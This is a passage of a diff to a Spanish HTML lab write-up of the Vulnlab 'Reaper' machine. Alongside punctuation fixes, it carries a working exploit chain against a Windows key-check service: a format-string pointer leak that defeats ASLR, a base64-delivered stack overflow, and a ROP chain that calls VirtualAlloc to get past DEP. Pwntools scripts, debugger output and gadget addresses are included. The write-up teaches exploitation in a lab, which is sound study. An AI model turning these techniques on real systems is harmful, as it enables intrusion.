-<p class="plain-text">Iniciamos la primera vulnerabilidad, en la opción <code class="language-plaintext highlighter-rouge">1</code> enviamos los primeros <code class="language-plaintext highlighter-rouge">24</code> bytes de la key para validarla, luego la reemplazamos con el formato <code class="language-plaintext highlighter-rouge">%p</code> que deberia hacer un leak de un puntero explotando el format string, luego de ello usamos la opción <code class="language-plaintext highlighter-rouge">2</code></p>
+<p class="plain-text">Iniciamos la primera vulnerabilidad, en la opción <code class="language-plaintext highlighter-rouge">1</code> enviamos los primeros <code class="language-plaintext highlighter-rouge">24</code> bytes de la key para validarla, luego la reemplazamos con el formato <code class="language-plaintext highlighter-rouge">%p</code> que deberia hacer un leak de un puntero explotando el format string, luego de ello usamos la opción <code class="language-plaintext highlighter-rouge">2</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">Choose an option:
 1. Set key
 2. Activate key
 3. Exit
 1
-Enter a key: 100-FE9A1-500-A270-0102-  
+Enter a key: 100-FE9A1-500-A270-0102-
 Valid key format
 Choose an option:
 1. Set key
@@ -394,14 +384,14 @@ Choose an option:
 2</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Cuando llegamos al breakpoint en la llamada a la función <code class="language-plaintext highlighter-rouge">send</code> que envia el buffer, en la posición <code class="language-plaintext highlighter-rouge">14</code> podemos ver que se remplaza el <code class="language-plaintext highlighter-rouge">%p</code> por un puntero como cadena</p>
+<p class="plain-text">Cuando llegamos al breakpoint en la llamada a la función <code class="language-plaintext highlighter-rouge">send</code> que envía el buffer, en la posición <code class="language-plaintext highlighter-rouge">14</code> podemos ver que se remplaza el <code class="language-plaintext highlighter-rouge">%p</code> por un puntero como cadena.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> bp ReaperKeyCheck + 0x16e3
 
 </span><span class="ro">0:000> </span><span class="p">g
 Breakpoint 1 hit
 ReaperKeyCheck+0x16e3:
-00007ff6`519216e3 ff15bfeb0100    call    qword ptr [ReaperKeyCheck+0x202a8 (00007ff6`519402a8)] ds:00007ff6`519402a8={WS2_32!send (00007ffd`f47428c0)}  
+00007ff6`519216e3 ff15bfeb0100    call    qword ptr [ReaperKeyCheck+0x202a8 (00007ff6`519402a8)] ds:00007ff6`519402a8={WS2_32!send (00007ffd`f47428c0)}
 
 </span><span class="ro">0:000></span><span class="p"> db rdx
 0000008a`0fefeb50  43 68 65 63 6b 69 6e 67-20 6b 65 79 3a 20 30 30  Checking key: 00
@@ -414,7 +404,7 @@ ReaperKeyCheck+0x16e3:
 0000008a`0fefebc0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El puntero que se mostrará como leak en el format string apunta a una cadena y es parte del binario, especificamente muestra la base mas offset <code class="language-plaintext highlighter-rouge">0x20660</code>, si restamos este offset obtenemos la base del binario, con ello podemos bypassear el <code class="language-plaintext highlighter-rouge">ASLR</code></p>
+<p class="plain-text">El puntero que se mostrará como leak en el format string apunta a una cadena y es parte del binario, específicamente muestra la base mas offset <code class="language-plaintext highlighter-rouge">0x20660</code>, si restamos este offset obtenemos la base del binario, con ello podemos bypassear el <code class="language-plaintext highlighter-rouge">ASLR</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> da 0x007ff651940660
 00007ff6`51940660  "Checking key: "
@@ -422,13 +412,13 @@ ReaperKeyCheck+0x16e3:
 </span><span class="ro">0:000></span><span class="p"> lm m ReaperKeyCheck
 Browse full module list
 start             end                 module name
-00007ff6`51920000 00007ff6`51953000   ReaperKeyCheck C (no symbols)  
+00007ff6`51920000 00007ff6`51953000   ReaperKeyCheck C (no symbols)
 
 </span><span class="ro">0:000></span><span class="p"> ? 0x007ff651940660 - 0x00007ff651920000
 Evaluate expression: 132704 = 00000000`00020660</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Automatizamos este proceso en un script de python, primero validamos la key, luego sobrescribimos la key por un <code class="language-plaintext highlighter-rouge">%p</code> que muestra un leak y al restar el offset muestra la dirección base del binario, podemos simplemente comprobarlo al ejecutar el exploit</p>
+<p class="plain-text">Automatizamos este proceso en un script de python, primero validamos la key, luego sobrescribimos la key por un <code class="language-plaintext highlighter-rouge">%p</code> que muestra un leak y al restar el offset muestra la dirección base del binario, podemos simplemente comprobarlo al ejecutar el exploit.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, log
@@ -436,7 +426,7 @@ Evaluate expression: 132704 = 00000000`00020660</span>
 shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 4141</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"100-FE9A1-500-A270-0102-"</span><span class="p">)  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"100-FE9A1-500-A270-0102-"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%p"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
@@ -450,7 +440,7 @@ shell.interactive()</span>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 4141: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 4141: Done
 [</span><span class="az">*</span><span class="p">] Binary base: 0x7ff651920000
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 Could not find key!
@@ -461,7 +451,7 @@ Choose an option:
 </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Una vez solucionado el <code class="language-plaintext highlighter-rouge">ASLR</code> saltamos a la siguiente vulnerabilidad, definimos como payload <code class="language-plaintext highlighter-rouge">100</code> bytes creados con <code class="language-plaintext highlighter-rouge">cyclic</code> para encontrar el offset, luego hace un encode de la cadena en <code class="language-plaintext highlighter-rouge">base64</code> y la envía ocasionando un buffer overflow</p>
+<p class="plain-text">Una vez solucionado el <code class="language-plaintext highlighter-rouge">ASLR</code> saltamos a la siguiente vulnerabilidad, definimos como payload <code class="language-plaintext highlighter-rouge">100</code> bytes creados con <code class="language-plaintext highlighter-rouge">cyclic</code> para encontrar el offset, luego hace un encode de la cadena en <code class="language-plaintext highlighter-rouge">base64</code> y la envía ocasionando un buffer overflow.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, cyclic, base64
@@ -472,15 +462,15 @@ payload</span><span class="o">  =</span><span class="no"> b</span><span class="s
 payload</span><span class="o"> +=</span><span class="p"> cyclic(</span><span class="mi">100</span><span class="p">,</span><span class="am"> n</span><span class="o">=</span><span class="mi">8</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"100-FE9A1-500-A270-0102-"</span><span class="o"> +</span><span class="p"> base64.b64encode(payload))  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"100-FE9A1-500-A270-0102-"</span><span class="o"> +</span><span class="p"> base64.b64encode(payload))
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el exploit podemos mirar en el debugger que el programa corrompe en el <code class="language-plaintext highlighter-rouge">ret</code> e intenta retornar a una dirección que es parte de la cadena <code class="language-plaintext highlighter-rouge">cyclic</code></p>
+<p class="plain-text">Al ejecutar el exploit podemos mirar en el debugger que el programa corrompe en el <code class="language-plaintext highlighter-rouge">ret</code> e intenta retornar a una dirección que es parte de la cadena <code class="language-plaintext highlighter-rouge">cyclic</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> g
 (34c0.3524): Access violation - code c0000005 (first chance)
-First chance exceptions are reported before any exception handling.  
+First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
 ReaperKeyCheck+0x16f1:
 00007ff6`519216f1 c3              ret
@@ -489,13 +479,13 @@ ReaperKeyCheck+0x16f1:
 0000005f`862fe658  61616161`6161616c</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ahora calculamos el offset que deberian ser <code class="language-plaintext highlighter-rouge">88</code> bytes para llegar al return address</p>
+<p class="plain-text">Ahora calculamos el offset que deberian ser <code class="language-plaintext highlighter-rouge">88</code> bytes para llegar al return address.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ cyclic</span><span class="p"> -n 8 -l 0x616161616161616c  
+<code><span class="ve">❯ cyclic</span><span class="p"> -n 8 -l 0x616161616161616c
 88</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para comprobar que sea el offset correcto escribimos el siguiente exploit, ahora el payload inicia llenando con <code class="language-plaintext highlighter-rouge">88 A's</code> el offset antes del return address, luego envia <code class="language-plaintext highlighter-rouge">B's</code> como dirección de retorno y algunas <code class="language-plaintext highlighter-rouge">C's</code> que se almacenarán en el stack</p>
+<p class="plain-text">Para comprobar que sea el offset correcto escribimos el siguiente exploit, ahora el payload inicia llenando con <code class="language-plaintext highlighter-rouge">88 A's</code> el offset antes del return address, luego envía <code class="language-plaintext highlighter-rouge">B's</code> como dirección de retorno y algunas <code class="language-plaintext highlighter-rouge">C's</code> que se almacenarán en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, cyclic, base64
@@ -511,15 +501,15 @@ payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s
 payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 24</span><span class="p">
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"100-FE9A1-500-A270-0102-"</span><span class="o"> +</span><span class="p"> base64.b64encode(payload))  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"100-FE9A1-500-A270-0102-"</span><span class="o"> +</span><span class="p"> base64.b64encode(payload))
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al correrlo nuevamente corrompe pero si miramos el debugger ahora intenta retornar a <code class="language-plaintext highlighter-rouge">0x4242424242424242</code> que son las <code class="language-plaintext highlighter-rouge">B's</code> y en el stack se almacenan los otros bytes</p>
+<p class="plain-text">Al correrlo nuevamente corrompe pero si miramos el debugger ahora intenta retornar a <code class="language-plaintext highlighter-rouge">0x4242424242424242</code> que son las <code class="language-plaintext highlighter-rouge">B's</code> y en el stack se almacenán los otros bytes.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000> </span><span class="p">g
 (366c.2d98): Access violation - code c0000005 (first chance)
-First chance exceptions are reported before any exception handling.  
+First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
 ReaperKeyCheck+0x16f1:
 00007ff6`519216f1 c3              ret
@@ -531,48 +521,47 @@ ReaperKeyCheck+0x16f1:
 0000006c`745feca0  43434343`43434343</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Algo a tener en cuenta es el <code class="language-plaintext highlighter-rouge">DEP</code> ya que en una explotación sencilla saltariamos al stack con un gadget equivalente a <code class="language-plaintext highlighter-rouge">jmp rsp</code> pero esta protección hace que el stack no sea ejecutable complicando el proceso, podemos probar evadirlo con un ropchain</p>
+<p class="plain-text">Algo a tener en cuenta es el <code class="language-plaintext highlighter-rouge">DEP</code> ya que en una explotación sencilla saltariamos al stack con un gadget equivalente a <code class="language-plaintext highlighter-rouge">jmp rsp</code> pero esta protección hace que el stack no sea ejecutable complicando el proceso, podemos probar evadirlo con un ropchain.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> !vprot rsp
 BaseAddress:       0000006c745fe000
 AllocationBase:    0000006c74500000
-AllocationProtect: 00000004  PAGE_READWRITE  
+AllocationProtect: 00000004  PAGE_READWRITE
 RegionSize:        0000000000002000
 State:             00001000  MEM_COMMIT
-Protect:           00000004  PAGE_READWRITE  
+Protect:           00000004  PAGE_READWRITE
 Type:              00020000  MEM_PRIVATE</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entre las funciones que podemos utilizar para evadir <code class="language-plaintext highlighter-rouge">DEP</code> se encuentra <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, la podemos encontrar el offset <code class="language-plaintext highlighter-rouge">0x20000</code> del binario, podemos comprobar desde el debugger que esta la dirección es una referencia a su dirección dentro de <code class="language-plaintext highlighter-rouge">kernel32</code></p>
+<p class="plain-text">Entre las funciones que podemos utilizar para evadir <code class="language-plaintext highlighter-rouge">DEP</code> se encuentra <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, la podemos encontrar el offset <code class="language-plaintext highlighter-rouge">0x20000</code> del binario, podemos comprobar desde el debugger que esta la dirección es una referencia a su dirección dentro de <code class="language-plaintext highlighter-rouge">kernel32</code>.</p>
 <a href="/vulnlab/reaper/22.png" target="_blank"><div><p><img src="/vulnlab/reaper/22.png"></p></div></a>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> dqs ReaperKeyCheck + 0x20000 L1
-00007ff6`51940000  00007ffd`f3c73bf0 KERNEL32!VirtualAllocStub  </span>
+00007ff6`51940000  00007ffd`f3c73bf0 KERNEL32!VirtualAllocStub</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <a href="https://learn.microsoft.com/es-es/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a> nos servirá para cambiar los privilegios del stack ya que reserva un espacio en memoria, lo mas relevante es que en el primer argumento podemos indicar la dirección donde queremos hacerlo y con el último la protección</p>
+<p class="plain-text">La función <a href="https://learn.microsoft.com/es-es/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a> nos servirá para cambiar los privilegios del stack ya que reserva un espacio en memoria, lo mas relevante es que en el primer argumento podemos indicar la dirección donde queremos hacerlo y con el último la protección.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="no">LPVOID</span><span class="na"> VirtualAlloc</span><span class="p">(
   [</span><span class="mi">in</span><span class="p">,</span><span class="mi"> optional</span><span class="p">]</span><span class="no"> LPVOID</span><span class="p"> lpAddress,
   [</span><span class="mi">in</span><span class="p">]</span><span class="no">           SIZE_T</span><span class="p"> dwSize,
-  [</span><span class="mi">in</span><span class="p">]</span><span class="no">           DWORD</span><span class="p">  flAllocationType,  
+  [</span><span class="mi">in</span><span class="p">]</span><span class="no">           DWORD</span><span class="p">  flAllocationType,
   [</span><span class="mi">in</span><span class="p">]</span><span class="no">           DWORD</span><span class="p">  flProtect
 );</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">En el <code class="language-plaintext highlighter-rouge">lpAddress</code> podemos pasar la dirección del <code class="language-plaintext highlighter-rouge">rsp</code> donde iniciaremos, en el <code class="language-plaintext highlighter-rouge">dwSize</code> usaremos <code class="language-plaintext highlighter-rouge">0x1</code> que reservará una página, en <code class="language-plaintext highlighter-rouge">flAllocationType</code> pasaremos <code class="language-plaintext highlighter-rouge">MEM_COMMIT</code> o <code class="language-plaintext highlighter-rouge">0x1000</code> y finalmente en <code class="language-plaintext highlighter-rouge">flProtect</code> usaremos <code class="language-plaintext highlighter-rouge">0x40</code> que es igual a <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READ_WRITE</code>, de esta forma se nos permitiría ejecutar el shellcode</p>
+<p class="plain-text">En el <code class="language-plaintext highlighter-rouge">lpAddress</code> podemos pasar la dirección del <code class="language-plaintext highlighter-rouge">rsp</code> donde iniciaremos, en el <code class="language-plaintext highlighter-rouge">dwSize</code> usaremos <code class="language-plaintext highlighter-rouge">0x1</code> que reservará una página, en <code class="language-plaintext highlighter-rouge">flAllocationType</code> pasaremos <code class="language-plaintext highlighter-rouge">MEM_COMMIT</code> o <code class="language-plaintext highlighter-rouge">0x1000</code> y finalmente en <code class="language-plaintext highlighter-rouge">flProtect</code> usaremos <code class="language-plaintext highlighter-rouge">0x40</code> que es igual a <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READ_WRITE</code>, de esta forma se nos permitiría ejecutar el shellcode.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">VirtualAlloc(</span><span class="mi">$rsp</span><span class="p">,</span><span class="mi"> 0x1</span><span class="p">, </span><span class="mi">0x1000</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">);  </span>
+<code><span class="p">VirtualAlloc(</span><span class="mi">$rsp</span><span class="p">,</span><span class="mi"> 0x1</span><span class="p">, </span><span class="mi">0x1000</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">);</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nuestra idea será establecer estos valores en los registros <code class="language-plaintext highlighter-rouge">rcx</code>, <code class="language-plaintext highlighter-rouge">rdx</code>, <code class="language-plaintext highlighter-rouge">r8</code> y <code class="language-plaintext highlighter-rouge">r9</code> que corresponden a la <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">convención de llamadas</a>, para buscar gadgets usaremos <code class="language-plaintext highlighter-rouge">ropper</code></p>
+<p class="plain-text">Nuestra idea será establecer estos valores en los registros <code class="language-plaintext highlighter-rouge">rcx</code>, <code class="language-plaintext highlighter-rouge">rdx</code>, <code class="language-plaintext highlighter-rouge">r8</code> y <code class="language-plaintext highlighter-rouge">r9</code> que corresponden a la <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">convención de llamadas</a>, para buscar gadgets usaremos <code class="language-plaintext highlighter-rouge">ropper</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ropper</span><span class="p"> --file dev_keysvc.exe -I 0x0 --console
-</span><span class="ve">[INFO]</span><span class="p"> Load gadgets from cache
 </span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
 </span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
-</span><span class="ro">(dev_keysvc.exe/PE/x86_64)> </span><span class="p">search pop rax; ret;  
+</span><span class="ro">(dev_keysvc.exe/PE/x86_64)> </span><span class="p">search pop rax; ret;
 </span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rax; ret;
 
 </span><span class="ve">[INFO]</span><span class="p"> File: dev_keysvc.exe
@@ -581,37 +570,37 @@ Type:              00020000  MEM_PRIVATE</span>
 </span><span class="ro">(dev_keysvc.exe/PE/x86_64)></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">En el registro <code class="language-plaintext highlighter-rouge">rcx</code> debemos guardar la dirección del <code class="language-plaintext highlighter-rouge">rsp</code>, podemos usar el gadget <code class="language-plaintext highlighter-rouge">xor rbx, rsp</code> y si <code class="language-plaintext highlighter-rouge">rbx</code> vale <code class="language-plaintext highlighter-rouge">0</code> tomará el valor de <code class="language-plaintext highlighter-rouge">rsp</code>, luego lo movemos a <code class="language-plaintext highlighter-rouge">rcx</code></p>
+<p class="plain-text">En el registro <code class="language-plaintext highlighter-rouge">rcx</code> debemos guardar la dirección del <code class="language-plaintext highlighter-rouge">rsp</code>, podemos usar el gadget <code class="language-plaintext highlighter-rouge">xor rbx, rsp</code> y si <code class="language-plaintext highlighter-rouge">rbx</code> vale <code class="language-plaintext highlighter-rouge">0</code> tomará el valor de <code class="language-plaintext highlighter-rouge">rsp</code>, luego lo movemos a <code class="language-plaintext highlighter-rouge">rcx</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1"># $rcx = $rsp</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x020d9</span><span class="p">)</span><span class="c1"> # pop rbx; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">                   # key for xor</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x01fa0</span><span class="p">)</span><span class="c1"> # xor rbx, rsp; ret;</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x01fc2</span><span class="p">)</span><span class="c1"> # push rbx; pop rax; ret;  </span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x01fc2</span><span class="p">)</span><span class="c1"> # push rbx; pop rax; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x01f80</span><span class="p">)</span><span class="c1"> # mov rcx, rax; ret;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">En <code class="language-plaintext highlighter-rouge">rdx</code> debemos guardar <code class="language-plaintext highlighter-rouge">0x1</code>, existe el gadget <code class="language-plaintext highlighter-rouge">mov rdx, r13</code> y podemos guardar valores en <code class="language-plaintext highlighter-rouge">r13</code> con un <code class="language-plaintext highlighter-rouge">pop</code> pero termina con un <code class="language-plaintext highlighter-rouge">call rax</code> para ello guardaremos en el registro <code class="language-plaintext highlighter-rouge">rax</code> el gadget <code class="language-plaintext highlighter-rouge">pop rax; ret;</code> que solo saltará al siguiente gadget</p>
+<p class="plain-text">En <code class="language-plaintext highlighter-rouge">rdx</code> debemos guardar <code class="language-plaintext highlighter-rouge">0x1</code>, existe el gadget <code class="language-plaintext highlighter-rouge">mov rdx, r13</code> y podemos guardar valores en <code class="language-plaintext highlighter-rouge">r13</code> con un <code class="language-plaintext highlighter-rouge">pop</code> pero termina con un <code class="language-plaintext highlighter-rouge">call rax</code> para ello guardaremos en el registro <code class="language-plaintext highlighter-rouge">rax</code> el gadget <code class="language-plaintext highlighter-rouge">pop rax; ret;</code> que solo saltará al siguiente gadget.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1"># $rdx = 0x1</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x0150a</span><span class="p">)</span><span class="c1"> # pop rax; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x0150a</span><span class="p">)</span><span class="c1"> # pop rax; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x047b3</span><span class="p">)</span><span class="c1"> # pop r13; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x1</span><span class="p">)</span><span class="c1">                   # dwSize</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x0368f</span><span class="p">)</span><span class="c1"> # mov rdx, r13; call rax;  </span>
+rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x0368f</span><span class="p">)</span><span class="c1"> # mov rdx, r13; call rax;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nuestra cadena carga el valor a <code class="language-plaintext highlighter-rouge">rbx</code> que luego lo mueve a <code class="language-plaintext highlighter-rouge">r9</code> y establece <code class="language-plaintext highlighter-rouge">r8</code> a <code class="language-plaintext highlighter-rouge">0</code>, finalmente añade el valor de <code class="language-plaintext highlighter-rouge">r9</code> al registro <code class="language-plaintext highlighter-rouge">r8</code> dejando así en este un <code class="language-plaintext highlighter-rouge">0x1000</code></p>
+<p class="plain-text">Nuestra cadena carga el valor a <code class="language-plaintext highlighter-rouge">rbx</code> que luego lo mueve a <code class="language-plaintext highlighter-rouge">r9</code> y establece <code class="language-plaintext highlighter-rouge">r8</code> a <code class="language-plaintext highlighter-rouge">0</code>, finalmente añade el valor de <code class="language-plaintext highlighter-rouge">r9</code> al registro <code class="language-plaintext highlighter-rouge">r8</code> dejando así en este un <code class="language-plaintext highlighter-rouge">0x1000</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1"># $r8 = 0x1000</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x020d9</span><span class="p">)</span><span class="c1"> # pop rbx; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x1000</span><span class="p">)</span><span class="c1">                # flAllocationType</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x01f90</span><span class="p">)</span><span class="c1"> # mov r9, rbx; mov r8, 0; add rsp, 8; ret;  </span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x01f90</span><span class="p">)</span><span class="c1"> # mov r9, rbx; mov r8, 0; add rsp, 8; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">                   # padding for pop</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x03918</span><span class="p">)</span><span class="c1"> # add r8, r9; add rax, r8; ret;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para cargar un valor a <code class="language-plaintext highlighter-rouge">r9</code> podemos usar el gadget <code class="language-plaintext highlighter-rouge">cmove r9, rdx</code> pero esta solo se ejecuta si se activa una flag, podemos activar la flag <code class="language-plaintext highlighter-rouge">zf</code> con un <code class="language-plaintext highlighter-rouge">xor rax, rax</code> y podemos usar la cadena <code class="language-plaintext highlighter-rouge">rop</code> que armamos desde antes para cargar el valor a <code class="language-plaintext highlighter-rouge">rdx</code></p>
+<p class="plain-text">Para cargar un valor a <code class="language-plaintext highlighter-rouge">r9</code> podemos usar el gadget <code class="language-plaintext highlighter-rouge">cmove r9, rdx</code> pero esta solo se ejecuta si se activa una flag, podemos activar la flag <code class="language-plaintext highlighter-rouge">zf</code> con un <code class="language-plaintext highlighter-rouge">xor rax, rax</code> y podemos usar la cadena <code class="language-plaintext highlighter-rouge">rop</code> que armamos desde antes para cargar el valor a <code class="language-plaintext highlighter-rouge">rdx</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1"># $r9 = 0x40</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x0150a</span><span class="p">)</span><span class="c1"> # pop rax; ret;</span><span class="p">
@@ -620,10 +609,10 @@ rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span
 rop</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x40</span><span class="p">)</span><span class="c1">                  # flProtect</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x0368f</span><span class="p">)</span><span class="c1"> # mov rdx, r13; call rax;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1f27f</span><span class="p">)</span><span class="c1"> # xor rax, rax; ret;</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1f37d</span><span class="p">)</span><span class="c1"> # cmove r9, rdx; mov rax, r9; ret;  </span>
